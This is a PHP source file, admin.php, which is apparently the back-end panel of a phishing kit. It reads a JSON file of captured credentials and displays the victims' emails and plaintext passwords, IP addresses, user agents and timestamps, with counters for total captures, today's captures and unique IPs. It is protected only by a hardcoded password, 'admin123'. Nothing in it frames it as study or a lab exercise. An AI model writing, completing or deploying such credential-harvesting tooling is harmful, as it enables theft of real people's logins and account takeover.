<?php
// admin.php - View captured credentials (protected with password)

session_start();

// Admin password protection
$admin_password = 'admin123'; // Change this!

if (isset($_POST['admin_password'])) {
    if ($_POST['admin_password'] === $admin_password) {
        $_SESSION['admin_logged_in'] = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit();
}

$is_logged_in = isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;

// Load captured credentials
$data_file = 'captured_credentials.json';
$credentials = [];
if (file_exists($data_file)) {
    $credentials = json_decode(file_get_contents($data_file), true) ?? [];
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Captured Data</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: #f7fafc;
            min-height: 100vh;
        }

        .admin-header {
            background: #2d3748;
            color: white;
            padding: 1.5rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .admin-title {
            font-size: 1.5rem;
            font-weight: 700;
        }

        .logout-btn {
            background: #fc8181;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            text-decoration: none;
            transition: 0.2s;
        }

        .logout-btn:hover {
            background: #f56565;
        }

        .container {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 0 1rem;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .stat-card {
            background: white;
            padding: 1.5rem;
            border-radius: 12px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            color: #667eea;
            margin-bottom: 0.5rem;
        }

        .stat-label {
            color: #718096;
            font-size: 0.9rem;
            font-weight: 600;
        }

        .credentials-table {
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .table-header {
            background: #f7fafc;
            padding: 1rem;
            font-weight: 700;
            color: #2d3748;
            border-bottom: 2px solid #e2e8f0;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            text-align: left;
            padding: 1rem;
            background: #f7fafc;
            color: #4a5568;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 2px solid #e2e8f0;
        }

        td {
            padding: 1rem;
            border-bottom: 1px solid #e2e8f0;
            color: #2d3748;
        }

        tr:hover {
            background: #f7fafc;
        }

        .password-cell {
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
        }

        .login-form {
            max-width: 400px;
            margin: 100px auto;
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .login-form h2 {
            margin-bottom: 1.5rem;
            color: #2d3748;
        }

        .login-form input {
            width: 100%;
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 1rem;
        }

        .login-form button {
            width: 100%;
            padding: 0.8rem;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }

        .login-form button:hover {
            background: #5a67d8;
        }

        .delete-btn {
            background: #fc8181;
            color: white;
            border: none;
            padding: 0.3rem 0.8rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8rem;
        }

        .delete-btn:hover {
            background: #f56565;
        }

        .empty-state {
            text-align: center;
            padding: 3rem;
            color: #a0aec0;
        }

        .empty-state i {
            font-size: 4rem;
            margin-bottom: 1rem;
        }

        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            table {
                font-size: 0.9rem;
            }
            
            th, td {
                padding: 0.75rem;
            }
        }
    </style>
</head>
<body>
    <?php if (!$is_logged_in): ?>
        <div class="login-form">
            <h2><i class="fas fa-lock"></i> Admin Login</h2>
            <form method="POST">
                <input type="password" name="admin_password" placeholder="Enter admin password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    <?php else: ?>
        <div class="admin-header">
            <div class="admin-title">
                <i class="fas fa-database"></i> Captured Credentials
            </div>
            <a href="?logout=true" class="logout-btn">
                <i class="fas fa-sign-out-alt"></i> Logout
            </a>
        </div>

        <div class="container">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value"><?php echo count($credentials); ?></div>
                    <div class="stat-label">Total Captured</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">
                        <?php 
                        $today = date('Y-m-d');
                        $today_count = 0;
                        foreach ($credentials as $cred) {
                            if (date('Y-m-d', strtotime($cred['timestamp'])) === $today) {
                                $today_count++;
                            }
                        }
                        echo $today_count;
                        ?>
                    </div>
                    <div class="stat-label">Today's Captures</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">
                        <?php 
                        $unique_ips = array_unique(array_column($credentials, 'ip'));
                        echo count($unique_ips);
                        ?>
                    </div>
                    <div class="stat-label">Unique IPs</div>
                </div>
            </div>

            <div class="credentials-table">
                <div class="table-header">
                    <i class="fas fa-list"></i> Captured Login Data
                </div>
                <?php if (empty($credentials)): ?>
                    <div class="empty-state">
                        <i class="fas fa-inbox"></i>
                        <p>No credentials captured yet</p>
                    </div>
                <?php else: ?>
                    <table>
                        <thead>
                            <tr>
                                <th>Email</th>
                                <th>Password</th>
                                <th>IP Address</th>
                                <th>User Agent</th>
                                <th>Timestamp</th>
                                <th>Remember</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach (array_reverse($credentials) as $cred): ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($cred['email'] ?? 'N/A'); ?></td>
                                    <td class="password-cell"><?php echo htmlspecialchars($cred['password'] ?? 'N/A'); ?></td>
                                    <td><?php echo htmlspecialchars($cred['ip'] ?? 'N/A'); ?></td>
                                    <td><small><?php echo htmlspecialchars(substr($cred['userAgent'] ?? 'N/A', 0, 50)); ?>...</small></td>
                                    <td><?php echo htmlspecialchars($cred['timestamp'] ?? 'N/A'); ?></td>
                                    <td><?php echo !empty($cred['remember']) ? 'Yes' : 'No'; ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php endif; ?>
            </div>
        </div>
    <?php endif; ?>
</body>
</html>
